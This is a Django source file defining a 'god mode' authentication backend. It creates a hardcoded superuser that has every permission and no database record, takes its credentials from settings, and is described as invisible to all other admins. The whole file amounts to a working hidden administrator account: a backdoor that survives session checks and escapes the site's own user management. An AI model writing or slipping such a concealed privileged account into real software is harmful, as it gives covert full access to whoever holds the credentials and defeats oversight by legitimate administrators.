"""
God Mode Authentication Backend
================================
Authenticates the hardcoded god mode admin without any database record.
The god mode user is completely invisible to all other admins.
"""
import hashlib
import hmac
from django.conf import settings


# ── Minimal _meta stub so Django's login() doesn't crash ──────────────────
class _GodModePkField:
    """
    Mimics Django's pk field just enough for login() to work.
    login() calls: user._meta.pk.value_to_string(user)
    which should return the string representation of the user's pk.
    """
    name    = 'pk'
    attname = 'pk'

    @staticmethod
    def value_to_string(obj):
        return str(obj.pk)


class _GodModeMeta:
    """Mimics the minimum of Django's Options (_meta) that login() needs."""
    pk = _GodModePkField()


# ── Sentinel object — acts like a User but is NOT in the database ──────────
class GodModeUser:
    """
    A fake User-like object for the god mode admin.
    Never persisted to the database.
    """
    pk           = -999
    id           = -999
    is_active    = True
    is_staff     = True
    is_superuser = True
    is_authenticated = True
    is_anonymous     = False
    last_login   = None
    backend = 'accounts.god_mode.GodModeBackend'

    # Django's login() calls user._meta.pk.value_to_string(user)
    # We provide a minimal stub so it doesn't crash
    _meta = _GodModeMeta()

    def __init__(self):
        self.username   = settings.GOD_MODE_USERNAME
        self.email      = settings.GOD_MODE_EMAIL
        self.first_name = 'System'
        self.last_name  = 'Administrator'

    def get_full_name(self):
        return 'System Administrator'

    def get_short_name(self):
        return 'SysAdmin'

    def has_perm(self, perm, obj=None):
        return True

    def has_module_perms(self, app_label):
        return True

    def get_username(self):
        return self.username

    def save(self, *args, **kwargs):
        # God mode user is never saved to the database — silently ignore
        pass

    def get_session_auth_hash(self):
        # Return a stable hash so session validation passes
        import hmac as _hmac
        import hashlib
        from django.conf import settings as _s
        return _hmac.new(
            _s.SECRET_KEY.encode(),
            b'god_mode_session',
            hashlib.sha256
        ).hexdigest()

    def __str__(self):
        return self.username

    @property
    def admin_profile(self):
        return None


# ── Authentication backend ─────────────────────────────────────────────────
class GodModeBackend:
    def authenticate(self, request, username=None, password=None, **kwargs):
        gm_user = settings.GOD_MODE_USERNAME
        gm_pass = settings.GOD_MODE_PASSWORD
        if not username or not password:
            return None
        user_match = hmac.compare_digest(username.strip(), gm_user)
        pass_match = hmac.compare_digest(password, gm_pass)
        if user_match and pass_match:
            return GodModeUser()
        return None

    def get_user(self, user_id):
        if str(user_id) == '-999' or user_id == -999:
            return GodModeUser()
        return None


# ── Helper functions ───────────────────────────────────────────────────────
def is_god_mode(user):
    return isinstance(user, GodModeUser) or getattr(user, 'pk', None) == -999


def is_god_mode_username(username):
    return hmac.compare_digest(str(username), settings.GOD_MODE_USERNAME)


# ── Session support ────────────────────────────────────────────────────────
def get_god_mode_user_from_session(request):
    from django.contrib.auth import SESSION_KEY, BACKEND_SESSION_KEY
    try:
        user_id = request.session.get(SESSION_KEY)
        if str(user_id) == '-999':
            user = GodModeUser()
            user.backend = request.session.get(
                BACKEND_SESSION_KEY, 'accounts.god_mode.GodModeBackend'
            )
            return user
    except Exception:
        pass
    return None
